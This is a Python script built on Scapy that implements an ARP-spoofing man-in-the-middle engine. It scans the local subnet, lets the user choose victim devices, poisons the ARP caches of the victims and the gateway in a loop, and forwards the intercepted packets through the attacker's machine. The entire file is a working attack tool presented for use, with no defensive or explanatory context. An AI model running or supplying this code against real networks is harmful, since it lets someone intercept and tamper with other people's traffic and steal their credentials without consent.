from scapy.all import *
from scapy.layers.l2 import *
import threading
import time

class MITMEngine:
    def __init__(self):
        self.targets = []
        self.network_devices = []
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_mac = None
        self.sniffer = None
        self.spoofing = False
        self.stop_event = threading.Event()

    def initialize(self):
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.my_mac = get_if_hwaddr(conf.iface)
        if not self.gateway_mac:
            raise Exception("Failed to resolve gateway MAC")
        if not self.gateway_ip:
            raise Exception("Failed to resolve gateway IP")
        if not self.my_mac:
            raise Exception("Failed to resolve machine's mac")
    def get_mac(self, ip):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered, _ = srp(packet, timeout=3, verbose=0)
        if answered:
            return answered[0][1].hwsrc
        return None

    def scan(self, args=None):
        self.network_devices.clear()
        ip_range = ".".join(self.gateway_ip.split(".")[:3]) + ".0/24"
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
        result = srp(packet, timeout=3, verbose=0)[0]
        for sent, received in result:
            self.network_devices.append({"ip": received.psrc, "mac": received.hwsrc})

        for index, device in enumerate(self.network_devices):
            marker = "[V]" if device in self.targets else "   "
            print(f"{index}. {marker} {device['ip']} : {device['mac']}")

    def set_target(self, args):
        if len(args) != 1 or not args[0].isdigit() or int(args[0]) >= len(self.network_devices):
            print("Error! Provide a valid device index from scan.")
            return
        if self.network_devices[int(args[0])] not in self.targets:
            self.targets.append(self.network_devices[int(args[0])])

    def show_targets(self, args=None):
        for target in self.targets:
            print(target["ip"] + " : " + target["mac"])

    def _spoof(self, target):
        packet_to_victim = Ether(dst=target["mac"]) / ARP(op=2, pdst=target["ip"], hwdst=target["mac"],
                                                          psrc=self.gateway_ip, hwsrc=self.my_mac)
        packet_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                                              psrc=target["ip"], hwsrc=self.my_mac)
        sendp(packet_to_victim, verbose=False)
        sendp(packet_to_gateway, verbose=False)

    def _spoof_loop(self):
        while not self.stop_event.is_set():
            for target in self.targets:
                self._spoof(target)
            time.sleep(5)

    def _forward_packet(self, packet):
        if not packet.haslayer(Ether):
            return
        for target in self.targets:
            if packet[Ether].src == target["mac"]:
                pkt = packet.copy()

                if pkt.haslayer(IP):
                    del pkt[IP].chksum
                if pkt.haslayer(TCP):
                    del pkt[TCP].chksum
                if pkt.haslayer(UDP):
                    del pkt[UDP].chksum

                pkt[Ether].src = self.my_mac
                pkt[Ether].dst = self.gateway_mac
                sendp(pkt, verbose=False)
            elif packet[Ether].src == self.gateway_mac and packet.haslayer(IP) and packet[IP].dst == target["ip"]:
                pkt = packet.copy()

                del pkt[IP].chksum
                if pkt.haslayer(TCP):
                    del pkt[TCP].chksum
                if pkt.haslayer(UDP):
                    del pkt[UDP].chksum

                pkt[Ether].src = self.my_mac
                pkt[Ether].dst = target["mac"]
                sendp(pkt, verbose=False)

    def start_spoof(self, args=None):
        if self.spoofing:
            print("Already spoofing!")
            return
        if not self.targets:
            print("No targets set.")
            return
        self.stop_event.clear()
        target_ips = " or ".join(f"host {target['ip']}" for target in self.targets)
        filter_str = f"not arp and (host {self.gateway_ip} or {target_ips})"
        self.sniffer = AsyncSniffer(filter=filter_str, prn=self._forward_packet, store=0)
        self.sniffer.start()

        self.spoofing = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop)
        self.spoof_thread.start()

    def stop_spoof(self, args=None):
        if not self.spoofing:
            print("Not currently spoofing.")
            return
        self.stop_event.set()
        self.spoof_thread.join()

        if self.sniffer:
            self.sniffer.stop()

        for target in self.targets:
            self._restore(target)
        print("Stopped.")

    def _restore(self, target):
        packet_to_victim = Ether(dst=target["mac"]) / ARP(op=2, pdst=target["ip"], hwdst=target["mac"],
                                                          psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        packet_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                                              psrc=target["ip"], hwsrc=target["mac"])
        sendp(packet_to_victim, verbose=False)
        sendp(packet_to_gateway, verbose=False)
